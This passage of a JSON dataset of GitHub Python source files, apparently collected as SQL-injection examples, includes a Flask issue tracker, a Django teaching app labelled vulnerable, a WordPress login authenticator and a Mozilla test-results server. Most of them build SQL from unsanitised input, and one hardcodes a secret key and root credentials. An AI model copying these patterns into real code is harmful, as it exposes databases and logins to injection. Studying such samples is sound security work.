set_clause_args = \", \".join(map(\n        lambda kv: f\"{kv[0]} = \\\"{kv[1]}\\\"\",\n        updated_fields.items(),\n    ))\n\n    if len(updated_fields) != 0:\n        cursor.execute(f\"\"\"\n            UPDATE issue\n            SET {set_clause_args}\n            WHERE id = {id}\n        \"\"\")\n\n    cursor.execute(f\"\"\"\n        DELETE FROM tag\n        WHERE issue_id = {id}\n    \"\"\")\n\n    for tag in fields.get(\"tags\", []):\n        cursor.execute(f\"\"\"\n            INSERT INTO tag (\n                namespace,\n                predicate,\n                value,\n                issue_id\n            )\n            VALUES (\n                \"{tag[\"namespace\"]}\",\n                \"{tag[\"predicate\"]}\",\n                \"{tag[\"value\"]}\",\n                \"{id}\"\n            )\n        \"\"\")\n\n@app.route(\"/api/issue/<int:id>\", methods=[\"GET\"])\ndef issue_get_endpoint(id):\n    cursor = get_database_connection().cursor()\n    issue = fetch_issue(cursor, id)\n\n    errors = []\n    status_code = 200\n    if issue is None:\n        errors.append(f\"issue #{id} does not exist\")\n        status_code = 404\n\n    return jsonify({\n        \"data\": list(issues.values()),\n        \"errors\": errors,\n    }), status_code\n\n@app.route(\"/api/issue\", methods=[\"POST\"])\n@validate_request_payload()\ndef issue_post_endpoint():\n    # [todo] Validate the issue(s) against Prolog rules.\n\n    # Attempt to create issues and tags in SQLite.\n    # Rollback in the event of an exception.\n    connection = get_database_connection()\n    try:\n        with connection:\n            for issue in request.get_json()[\"data\"]:\n                create_issue(connection.cursor(), issue)\n    except sqlite3.IntegrityError as error:\n        return jsonify({\n            \"data\": [],\n            \"errors\": [\n                \"failed to create rows in sqlite\",\n                str(error),\n            ],\n        }), 400\n\n    # [todo] Return the created issue(s).\n\n    return \"Not implemented.\", 501\n\n@app.route(\"/api/issue\", methods=[\"PUT\"])\n@validate_request_payload(require_id=True)\ndef issue_put_endpoint():\n    # [todo] Validate the issue(s) against Prolog rules.\n\n    connection = get_database_connection()\n    try:\n        with connection:\n            cursor = connection.cursor()\n            for issue in request.get_json().get(\"data\", {}):\n                fetched_issue = fetch_issue(cursor, issue.get(\"id\", -1))\n                if fetched_issue is None:\n                    create_issue(cursor, issue)\n                else:\n                    # Ensure that all fields are being updated. PUT has\n                    # replace semantics. For updating a subset of fields,\n                    # PATCH should be used.\n                    if \"title\" not in issue:\n                        issue[\"title\"] = \"\"\n                    if \"description\" not in issue:\n                        issue[\"description\"] = \"\"\n                    if \"tags\" not in issue:\n                        issue[\"tags\"] = []\n                    update_issue(cursor, issue[\"id\"], issue)\n    except Exception as error:\n        print(error)\n        return jsonify({\"error\": str(error)}), 500\n\n    # [todo] Return the patched issue(s).\n\n    return \"Not implemented.\", 501\n\n@app.route(\"/api/issue\", methods=[\"PATCH\"])\n@app.route(\"/api/issue/<int:id>\", methods=[\"PATCH\"])\ndef issue_patch_endpoint(id):\n    return \"Not implemented.\", 501\n\n@app.route(\"/api/issue/<int:id>\", methods=[\"DELETE\"])\ndef issue_delete_endpoint(id):\n    return \"Not implemented.\", 501\n\nif __name__ == \"__main__\":\n    # Setup database schema.\n    with open(SCHEMA_FILE) as schema:\n        connection = sqlite3.connect(DATABASE_FILE)\n        cursor = connection.cursor()\n        cursor.executescript(schema.read())\n        connection.commit()\n        connection.close()\n\n    # Parse port number.\n    parser = argparse.ArgumentParser(\n        description=\"tissue: a tiny issue tracker server\"\n    )\n    parser.add_argument(\n        \"--port\",\n        \"-p\",\n        type=int,\n        help=\"http server port\",\n        default=5000\n    )\n    args = parser.parse_args()\n\n    # Start HTTP server.\n    app.run(debug=True, host=\"0.0.0.0\", port=args.port)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/fangyansun/crimemap/blob/0b71166ecee537f59613252d01a0d0243a9a3beb",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper:\n\tdef connect(self, database=\"crimemap\"):\n\t\treturn pymysql.connect(host='localhost',\n\t\t\t\tuser=dbconfig.db_user,\n\t\t\t\tpasswd=dbconfig.db_password,\n\t\t\t\tdb=database)\n\n\tdef get_all_inputs(self):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"SELECT description FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\treturn cursor.fetchall()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef add_input(self, data):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\t# The following introduces a deliberate security flaw.See section on SQL injection below\n\t\t\tquery = \"INSERT INTO crimes (description) VALUES('{}');\".format(data)\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef clear_all(self):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"DELETE FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nurlailifajriyah/webapp-hw/blob/da152b7ba6195871e1133c290af0b11c3ed6aac4",
        "file_path": "/in-class/15 SQL and the Django ORM/example vulnerable application/sio/views.py",
        "source": "from django.shortcuts import render\nfrom django.db import transaction\nfrom django.core import serializers\nfrom django.http import HttpResponse\n\nfrom sio.models import *\nfrom sio.forms import *\n\ndef make_view(request,\n              messages=[],\n              create_student_form=CreateStudentForm(),\n              create_course_form=CreateCourseForm(),\n              register_student_form=RegisterStudentForm()):\n    context = {\n               'courses':Course.objects.all(),\n               'messages':messages,\n               'create_student_form':create_student_form,\n               'create_course_form':create_course_form,\n               'register_student_form':register_student_form,\n              }\n    return render(request, 'sio.html', context)\n\ndef home(request):\n    return make_view(request, [])\n\n@transaction.atomic\ndef create_student(request):\n    form = CreateStudentForm(request.POST)\n    if not form.is_valid():\n        return make_view(request, create_student_form=form)\n\n    new_student = Student(andrew_id=form.cleaned_data['andrew_id'],\n                          first_name=form.cleaned_data['first_name'],\n                          last_name=form.cleaned_data['last_name'])\n    new_student.save()\n    return make_view(request, ['Added %s'%new_student])\n\n@transaction.atomic\ndef create_course(request):\n    form = CreateCourseForm(request.POST)\n    if not form.is_valid():\n        return make_view(request, create_course_form=form)\n\n    new_course = Course(course_number=request.POST['course_number'],\n                        course_name=request.POST['course_name'],\n                        instructor=request.POST['instructor'])\n    new_course.save()\n    return make_view(request, messages=['Added %s'%new_course])\n\n@transaction.atomic\ndef register_student(request):\n    form = RegisterStudentForm(request.POST)\n    if not form.is_valid():\n        return make_view(request, register_student_form=form)\n\n    course = Course.objects.get(course_number=request.POST['course_number'])\n    student = Student.objects.get(andrew_id=request.POST['andrew_id'])\n    course.students.add(student)\n    course.save()\n    return make_view(request, messages=['Added %s to %s' % (student, course)])\n\n\ndef get_student_by_name(request):\n    first_name = request.GET.get('first_name', '')\n\n    # The normal use of the ORM to get students by first name:\n    #students = Student.objects.filter(first_name__exact=first_name)\n\n    # The correct way to use raw SQL to get students by first name:\n    #students = Student.objects.raw('select * from uni_student where first_name = %s', [first_name])\n\n    # Gets students by first name, but is vulnerable to SQL injection attacks:\n    students = Student.objects.raw('select * from sio_student where first_name = \\'' + first_name + '\\'')\n\n    response_text = serializers.serialize('json', students)\n    return HttpResponse(response_text, content_type='application/json')\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nurlailifajriyah/webapp-hw/blob/da152b7ba6195871e1133c290af0b11c3ed6aac4",
        "file_path": "/in-class/15 SQL and the Django ORM/example vulnerable application/webapps/settings.py",
        "source": "\"\"\"\nDjango settings for webapps project.\n\nGenerated by 'django-admin startproject' using Django 1.10.1.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.10/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/1.10/ref/settings/\n\"\"\"\n\nimport os\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/1.10/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'eumasrxjp9des1)c^0i%=fx6ge-++7e8qaxs8%%an6ait_@d_!'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'sio',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'webapps.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'webapps.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/1.10/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql_psycopg2', # Add 'postgresql_psycopg2', 'mysql', 'sqlite3' or 'oracle'.\n        'NAME': 'registration',                      # Or path to database file if using sqlite3.\n        # The following settings are not used with sqlite3:\n        'USER': 'postgres',\n        'PASSWORD': '',\n        'HOST': 'localhost',    # Empty for localhost through domain sockets or           '127.0.0.1' for localhost through TCP.\n        'PORT': '',             # Set to empty string for default.\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/1.10/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/1.10/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.10/howto/static-files/\n\nSTATIC_URL = '/static/'\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kchawla-pi/united-states-of-browsers/blob/4ddc0fccad0addcc34342cedf3b20317f2bf14df",
        "file_path": "/src/merge_db.py",
        "source": "import sqlite3\n\nfrom collections import OrderedDict as odict\n\nimport db_handler\nimport record_fetcher\n\ndef create_test_data():\n\ttest_record = odict(\n\t\t\t\t{'id': 1, 'url': 'https://www.mozilla.org/en-US/firefox/central/', 'title': None,\n\t\t\t\t 'rev_host': 'gro.allizom.www.', 'visit_count': 0, 'hidden': 0, 'typed': 0,\n\t\t\t\t 'favicon_id': None, 'frecency': 76, 'last_visit_date': None, 'guid': 'NNqZA_f2KHI1',\n\t\t\t\t 'foreign_count': 1, 'url_hash': 47356370932282, 'description': None,\n\t\t\t\t 'preview_image_url': None\n\t\t\t\t })\n\treturn test_record\n\n\ndef preprocess_record(record):\n\trecord.update({field: str(value) for field, value in record.items() if value is None})\n\tfield_names = ', '.join([str(field) for field in record.keys()])\n\tdata = list(record.values())\n\treturn field_names, data\n\n\ndef make_queries(table_name, field_names, values):\n\tqueries = {'create': '''CREATE TABLE {} ({})'''.format(table_name, field_names)}\n\tqueries.update({'insert': \"INSERT INTO {} VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\".format(table_name)})\n\treturn queries\n\n\ndef create_table(cursor):\n\ttry:\n\t\tcursor.execute(queries['create'])\n\texcept sqlite3.OperationalError as excep:\n\t\tprint(excep)\n\n\ndef insert_record(cursor, data):\n\tcursor.execute(queries['insert'], data)\n\tconn.commit()\n\n\ntest_record = create_test_data()\nfield_names, data = preprocess_record(test_record)\ntable_name = 'history'\nqueries = make_queries(table_name, field_names, values=data)\n\nprint(field_names)\n\nconn, cur, filepath = db_handler.connect_db('test.sqlite')\n\ncreate_table(cursor=cur)\ninsert_record(cursor=cur,data=data)\nrecord_yielder = record_fetcher.yield_prepped_records(cursor=cur, table=table_name, filepath=filepath)\n\nfor record_ in record_yielder:\n\tprint(record_)\n\t\nconn.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/harapekoaomushi/jupyterhub-wordpressauthenticator/blob/709985b8888735864e1e27a3e48682f37adc8de7",
        "file_path": "/setup.py",
        "source": "#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nfrom setuptools import setup, find_packages\nimport sys\n\n\ndef _requires_from_file(filename):\n    return open(filename).read().splitlines()\n\nsetup_args = dict(\n    name='jupyterhub-wordpressauthenticator',\n    version='0.1',\n    description='WordPress Authenticator for JupyterHub',\n    url='https://github.com/harapekoaomushi/jupyterhub-wordpressauthenticator',\n    author='Harapeko Aomushi',\n    author_email='harapeko1aomushi@gmail.com',\n    long_description=\"WordPress Authenticator for JupyterHub. Please read README.md\",\n    license='MIT License',\n    packages=find_packages(),\n    install_requires=_requires_from_file('requirements.txt'),\n    keywords = ['Interactive', 'Interpreter', 'Shell', 'Web'],\n    classifiers = [\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Intended Audience :: Science/Research',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License'\n    ]\n)\n\nif 'setuptools' in sys.modules:\n    setup_args['install_requires'] = install_requires = []\n    with open('requirements.txt') as f:\n        for line in f.readlines():\n            req = line.strip()\n            if not req or req.startswith(('-e', '#')):\n                continue\n            install_requires.append(req)\n\n\ndef main():\n    setup(**setup_args)\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/harapekoaomushi/jupyterhub-wordpressauthenticator/blob/709985b8888735864e1e27a3e48682f37adc8de7",
        "file_path": "/wordpressauthenticator/wordpressauthenticator.py",
        "source": "from jupyterhub.auth import Authenticator\nfrom tornado import gen\n\nfrom traitlets import (\n    Unicode,\n    Int\n)\nimport pymysql\nfrom passlib.hash import phpass\n\n\nclass WordPressAuthenticator(Authenticator):\n    dbhost = Unicode(\"localhost\", config=True, help=\"URL or IP address of the database server\")\n    dbport = Int(3306, min=1, max=65535, config=True, help=\"port of the database server\")\n    dbuser = Unicode(config=True, help=\"user name to access your wordpress database\")\n    dbpassword = Unicode(config=True, help=\"password to access your wordpress database\")\n    dbname = Unicode(\"wordpress\", config=True, help=\"database name that your wordpress uses\")\n    table_prefix = Unicode(\"wp_\", config=True, help=\"table prefix for your wordpress\")\n\n    @gen.coroutine\n    def authenticate(self, handler, data):\n        args = {}\n        args[\"host\"] = self.dbhost\n        args[\"user\"] = self.dbuser\n        args[\"password\"] = self.dbpassword\n        args[\"db\"] = self.dbname\n        args[\"charset\"] = \"utf8mb4\"\n        args[\"cursorclass\"] = pymysql.cursors.Cursor\n\n        with pymysql.connect(**args) as cursor:\n            sql =   \"SELECT \" \\\n                            \"user_pass \" \\\n                    \"FROM \" \\\n                            \"{0}users \" \\\n                    \"WHERE \" \\\n                            \"user_login = \\\"{1}\\\"\" \\\n                    .format(self.table_prefix, data[\"username\"])\n            if cursor.execute(sql) == 0:\n                return None\n            if phpass.verify(data[\"password\"],cursor.fetchone()[0]) == True:\n                return data[\"username\"]\n        return None\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mozilla/ouija/blob/48849426e12ece8e0ca8c95af10288ca9d844eab",
        "file_path": "/src/server.py",
        "source": "import os\nimport calendar\nfrom datetime import datetime, timedelta\nfrom itertools import groupby\nfrom collections import Counter\nfrom functools import wraps\nfrom tools.failures import SETA_WINDOW\nfrom src import jobtypes\n\nimport MySQLdb\nfrom flask import Flask, request, json, Response, abort\n\nSCRIPT_DIR = os.path.abspath(os.path.dirname(__file__))\nstatic_path = os.path.join(os.path.dirname(SCRIPT_DIR), \"static\")\napp = Flask(__name__, static_url_path=\"\", static_folder=static_path)\nJOBSDATA = jobtypes.Treecodes()\n\n\nclass CSetSummary(object):\n    def __init__(self, cset_id):\n        self.cset_id = cset_id\n        self.green = Counter()\n        self.orange = Counter()\n        self.red = Counter()\n        self.blue = Counter()\n\n\ndef create_db_connnection():\n    return MySQLdb.connect(host=\"localhost\",\n                           user=\"root\",\n                           passwd=\"root\",\n                           db=\"ouija\")\n\n\ndef serialize_to_json(object):\n    \"\"\"Serialize class objects to json\"\"\"\n    try:\n        return object.__dict__\n    except AttributeError:\n        raise TypeError(repr(object) + 'is not JSON serializable')\n\n\ndef json_response(func):\n    \"\"\"Decorator: Serialize response to json\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        result = json.dumps(func(*args, **kwargs) or {\"error\": \"No data found for your request\"},\n                            default=serialize_to_json)\n        headers = [\n            (\"Content-Type\", \"application/json\"),\n            (\"Content-Length\", str(len(result)))\n        ]\n        return Response(result, status=200, headers=headers)\n\n    return wrapper\n\n\ndef get_date_range(dates):\n    if dates:\n        return {'startDate': min(dates).strftime('%Y-%m-%d %H:%M'),\n                'endDate': max(dates).strftime('%Y-%m-%d %H:%M')}\n\n\ndef clean_date_params(query_dict, delta=7):\n    \"\"\"Parse request date params\"\"\"\n    now = datetime.now()\n\n    # get dates params\n    start_date_param = query_dict.get('startDate') or query_dict.get('startdate')\n    end_date_param = query_dict.get('endDate') or query_dict.get('enddate')\n\n    # parse dates\n    end_date = (parse_date(end_date_param) or now)\n    start_date = parse_date(start_date_param) or end_date - timedelta(days=delta)\n\n    # validate dates\n    if start_date > now or start_date.date() >= end_date.date():\n        start_date = now - timedelta(days=7)\n        end_date = now + timedelta(days=1)\n\n    return start_date.date(), end_date.date()\n\n\ndef parse_date(date_):\n    if date_ is None:\n        return\n\n    masks = ['%Y-%m-%d',\n             '%Y-%m-%dT%H:%M',\n             '%Y-%m-%d %H:%M']\n\n    for mask in masks:\n        try:\n            return datetime.strptime(date_, mask)\n        except ValueError:\n            pass\n\n\ndef calculate_fail_rate(passes, retries, totals):\n    # skip calculation for slaves and platform with no failures\n    if passes == totals:\n        results = [0, 0]\n\n    else:\n        results = []\n        denominators = [totals - retries, totals]\n        for denominator in denominators:\n            try:\n                result = 100 - (passes * 100) / float(denominator)\n            except ZeroDivisionError:\n                result = 0\n            results.append(round(result, 2))\n\n    return dict(zip(['failRate', 'failRateWithRetries'], results))\n\n\ndef binify(bins, data):\n    result = []\n    for i, bin in enumerate(bins):\n        if i > 0:\n            result.append(len(filter(lambda x: x >= bins[i - 1] and x < bin, data)))\n        else:\n            result.append(len(filter(lambda x: x < bin, data)))\n\n    result.append(len(filter(lambda x: x >= bins[-1], data)))\n\n    return result\n\n\n@app.route(\"/data/results/flot/day/\")\n@json_response\ndef run_results_day_flot_query():\n    \"\"\"\n    This function returns the total failures/total jobs data per day for all platforms.\n    It is sending the data in the format required by flot.Flot is a jQuery package used\n    for 'attractive' plotting\n    \"\"\"\n    start_date, end_date = clean_date_params(request.args)\n\n    platforms = ['android4.0',\n                 'android2.3',\n                 'linux32',\n                 'winxp',\n                 'win7',\n                 'win8',\n                 'osx10.6',\n                 'osx10.7',\n                 'osx10.8']\n    db = create_db_connnection()\n\n    data_platforms = {}\n    for platform in platforms:\n        cursor = db.cursor()\n        cursor.execute(\"\"\"select DATE(date) as day,sum(result=\"%s\") as failures,count(*) as\n                          totals from testjobs where platform=\"%s\" and date >= \"%s\" and date <= \"%s\"\n                          group by day\"\"\" % ('testfailed', platform, start_date, end_date))\n\n        query_results = cursor.fetchall()\n\n        dates = []\n        data = {}\n        data['failures'] = []\n        data['totals'] = []\n\n        for day, fail, total in query_results:\n            dates.append(day)\n            timestamp = calendar.timegm(day.timetuple()) * 1000\n            data['failures'].append((timestamp, int(fail)))\n            data['totals'].append((timestamp, int(total)))\n\n        cursor.close()\n\n        data_platforms[platform] = {'data': data, 'dates': get_date_range(dates)}\n\n    db.close()\n    return data_platforms\n\n\n@app.route(\"/data/slaves/\")\n@json_response\ndef run_slaves_query():\n    start_date, end_date = clean_date_params(request.args)\n\n    days_to_show = (end_date - start_date).days\n    if days_to_show <= 8:\n        jobs = 5\n    else:\n        jobs = int(round(days_to_show * 0.4))\n\n    info = '''Only slaves with more than %d jobs are displayed.''' % jobs\n\n    db = create_db_connnection()\n    cursor = db.cursor()\n    cursor.execute(\"\"\"select slave, result, date from testjobs\n                      where result in\n                      (\"retry\", \"testfailed\", \"success\", \"busted\", \"exception\")\n                      and date between \"{0}\" and \"{1}\"\n                      order by date;\"\"\".format(start_date, end_date))\n\n    query_results = cursor.fetchall()\n    cursor.close()\n    db.close()\n\n    if not query_results:\n        return\n\n    data = {}\n    labels = 'fail retry infra success total'.split()\n    summary = {result: 0 for result in labels}\n    summary['jobs_since_last_success'] = 0\n    dates = []\n\n    for name, result, date in query_results:\n        data.setdefault(name, summary.copy())\n        data[name]['jobs_since_last_success'] += 1\n        if result == 'testfailed':\n            data[name]['fail'] += 1\n        elif result == 'retry':\n            data[name]['retry'] += 1\n        elif result == 'success':\n            data[name]['success'] += 1\n            data[name]['jobs_since_last_success'] = 0\n        elif result == 'busted' or result == 'exception':\n            data[name]['infra'] += 1\n        data[name]['total'] += 1\n        dates.append(date)\n\n    # filter slaves\n    slave_list = [slave for slave in data if data[slave]['total'] > jobs]\n\n    # calculate failure rate only for slaves that we're going to display\n    for slave in slave_list:\n        results = data[slave]\n        fail_rates = calculate_fail_rate(results['success'],\n                                         results['retry'],\n                                         results['total'])\n        data[slave]['sfr'] = fail_rates\n\n    platforms = {}\n\n    # group slaves by platform and calculate platform failure rate\n    slaves = sorted(data.keys())\n    for platform, slave_group in groupby(slaves, lambda x: x.rsplit('-', 1)[0]):\n        slaves = list(slave_group)\n\n        # don't calculate failure rate for platform we're not going to show\n        if not any(slave in slaves for slave in slave_list):\n            continue\n\n        platforms[platform] = {}\n        results = {}\n\n        for label in ['success', 'retry', 'total']:\n            r = reduce(lambda x, y: x + y,\n                       [data[slave][label] for slave in slaves])\n            results[label] = r\n\n        fail_rates = calculate_fail_rate(results['success'],\n                                         results['retry'],\n                                         results['total'])\n        platforms[platform].update(fail_rates)\n\n    # remove data that we don't need\n    for slave in data.keys():\n        if slave not in slave_list:\n            del data[slave]\n\n    return {'slaves': data,\n            'platforms': platforms,\n            'dates': get_date_range(dates),\n            'disclaimer': info}\n\n\n@app.route(\"/data/platform/\")\n@json_response\ndef run_platform_query():\n    platform = request.args.get(\"platform\")\n    build_system_type = request.args.get(\"build_system_type\")\n    start_date, end_date = clean_date_params(request.args)\n\n    log_message = 'platform: %s startDate: %s endDate: %s' % (platform,\n                                                              start_date.strftime('%Y-%m-%d'),\n                                                              end_date.strftime('%Y-%m-%d'))\n    app.logger.debug(log_message)\n\n    db = create_db_connnection()\n    cursor = db.cursor()\n\n    query = \"\"\"select distinct revision from testjobs\n                      where platform = '%s'\n                      and branch = 'mozilla-central'\n                      and date between '%s' and '%s'\n                      and build_system_type='%s'\n                      order by date desc;\"\"\" % (platform, start_date, end_date, build_system_type)\n\n    cursor.execute(query)\n\n    csets = cursor.fetchall()\n\n    cset_summaries = []\n    test_summaries = {}\n    dates = []\n\n    labels = 'green orange blue red'.split()\n    summary = {result: 0 for result in labels}\n\n    for cset in csets:\n        cset_id = cset[0]\n        cset_summary = CSetSummary(cset_id)\n\n        query = \"\"\"select result, testtype, date from testjobs\n                   where platform='%s' and buildtype='opt' and revision='%s' and\n                   build_system_type='%s' order by testtype\"\"\" % (\n            platform, cset_id, build_system_type)\n\n        cursor.execute(query)\n        test_results = cursor.fetchall()\n\n        for res, testtype, date in test_results:\n            test_summary = test_summaries.setdefault(testtype, summary.copy())\n\n            if res == 'success':\n                cset_summary.green[testtype] += 1\n                test_summary['green'] += 1\n            elif res == 'testfailed':\n                cset_summary.orange[testtype] += 1\n                test_summary['orange'] += 1\n            elif res == 'retry':\n                cset_summary.blue[testtype] += 1\n                test_summary['blue'] += 1\n            elif res == 'exception' or res == 'busted':\n                cset_summary.red[testtype] += 1\n                test_summary['red'] += 1\n            elif res == 'usercancel':\n                app.logger.debug('usercancel')\n            else:\n                app.logger.debug('UNRECOGNIZED RESULT: %s' % res)\n            dates.append(date)\n\n        cset_summaries.append(cset_summary)\n\n    cursor.close()\n    db.close()\n\n    # sort tests alphabetically and append total & percentage to end of the list\n    test_types = sorted(test_summaries.keys())\n    test_types += ['total', 'percentage']\n\n    # calculate total stats and percentage\n    total = Counter()\n    percentage = {}\n\n    for test in test_summaries:\n        total.update(test_summaries[test])\n    test_count = sum(total.values())\n\n    for key in total:\n        percentage[key] = round((100.0 * total[key] / test_count), 2)\n\n    fail_rates = calculate_fail_rate(passes=total['green'],\n                                     retries=total['blue'],\n                                     totals=test_count)\n\n    test_summaries['total'] = total\n    test_summaries['percentage'] = percentage\n\n    return {'testTypes': test_types,\n            'byRevision': cset_summaries,\n            'byTest': test_summaries,\n            'failRates': fail_rates,\n            'dates': get_date_range(dates)}\n\n\n@app.route(\"/data/jobtypes/\")\n@json_response\ndef run_jobtypes_query():\n    return {'jobtypes': JOBSDATA.jobtype_query()}\n\n\n@app.route(\"/data/seta/\")\n@json_response\ndef run_seta_query():\n    start_date, end_date = clean_date_params(request.args, delta=SETA_WINDOW)\n\n    db = create_db_connnection()\n    cursor = db.cursor()\n    query = \"select bugid, platform, buildtype, testtype, duration from testjobs \\\n             where failure_classification=2 and date>='%s' and date<='%s'\" % (start_date, end_date)\n    cursor.execute(query)\n    failures = {}\n    for d in cursor.fetchall():\n        failures.setdefault(d[0], []).append(d[1:])\n\n    return {'failures': failures}\n\n\n@app.route(\"/data/setasummary/\")\n@json_response\ndef run_seta_summary_query():\n    db = create_db_connnection()\n    cursor = db.cursor()\n    query = \"select distinct date from seta\"\n    cursor.execute(query)\n    retVal = {}\n    dates = []\n    for d in cursor.fetchall():\n        dates.append(d[0])\n\n    for d in dates:\n        query = \"select count(id) from seta where date='%s'\" % d\n        cursor.execute(query)\n        results = cursor.fetchall()\n        retVal['%s' % d] = \"%s\" % results[0]\n\n    return {'dates': retVal}\n\n\n@app.route(\"/data/setadetails/\")\n@json_response\ndef run_seta_details_query():\n    date = request.args.get(\"date\", \"\")\n    active = request.args.get(\"active\", 0)\n    buildbot = request.args.get(\"buildbot\", 0)\n    branch = request.args.get(\"branch\", '')\n    taskcluster = request.args.get(\"taskcluster\", 0)\n    priority = request.args.get(\"priority\", \"low\")\n    jobnames = JOBSDATA.jobnames_query()\n    if date == \"\" or date == \"latest\":\n        today = datetime.now()\n        date = today.strftime(\"%Y-%m-%d\")\n\n    db = create_db_connnection()\n    cursor = db.cursor()\n    query = \"select jobtype from seta where date='%s 00:00:00'\" % date\n    cursor.execute(query)\n    retVal = {}\n    retVal[date] = []\n    jobtype = []\n\n    # we only support fx-team and mozilla-inbound branch in seta\n    if (str(branch) in ['fx-team', 'mozilla-inbound', 'autoland']) is not True \\\n            and str(branch) != '':\n        abort(404)\n    for d in cursor.fetchall():\n        parts = d[0].split(\"'\")\n        jobtype.append([parts[1], parts[3], parts[5]])\n\n    alljobs = JOBSDATA.jobtype_query()\n\n    # Because we store high value jobs in seta table as default,\n    # so we return low value jobs(default) when the priority is 'low',\n    # otherwise we return high value jobs.\n    if priority == 'low':\n        low_value_jobs = [low_value_job for low_value_job in alljobs if\n                          low_value_job not in jobtype]\n        jobtype = low_value_jobs\n\n    if active:\n        active_jobs = []\n        for job in alljobs:\n            found = False\n            for j in jobtype:\n                if j[0] == job[0] and j[1] == job[1] and j[2] == job[2]:\n                    found = True\n                    break\n            if not found:\n                active_jobs.append(job)\n        jobtype = active_jobs\n\n    if buildbot:\n        active_jobs = []\n        # pick up buildbot jobs from job list to faster the filter process\n        buildbot_jobs = [job for job in jobnames if job['buildplatform'] == 'buildbot']\n        # find out the correspond job detail information\n        for job in jobtype:\n            for j in buildbot_jobs:\n                if j['name'] == job[2] and j['platform'] == job[0] and j['buildtype'] == job[1]:\n                    active_jobs.append(j['ref_data_name'] if branch is 'mozilla-inbound'\n                                       else j['ref_data_name'].replace('mozilla-inbound', branch))\n\n        jobtype = active_jobs\n\n    if taskcluster:\n        active_jobs = []\n        taskcluster_jobs = [job for job in jobnames if job['buildplatform'] == 'taskcluster']\n        for job in jobtype:\n            for j in taskcluster_jobs:\n                if j['name'] == job[2] and j['platform'] == job[0] and j['buildtype'] == job[1]:\n                    active_jobs.append(j['ref_data_name'])\n        jobtype = active_jobs\n\n    retVal[date] = jobtype\n    return {'jobtypes': retVal}\n\n\n@app.route(\"/data/jobnames/\")\n@json_response\ndef run_jobnames_query():\n    # inbound is a safe default\n    json_jobnames = {'results': JOBSDATA.jobnames_query()}\n\n    return json_jobnames\n\n\n@app.route(\"/data/dailyjobs/\")\n@json_response\ndef run_dailyjob_query():\n    start_date, end_date = clean_date_params(request.args)\n    db = create_db_connnection()\n    cursor = 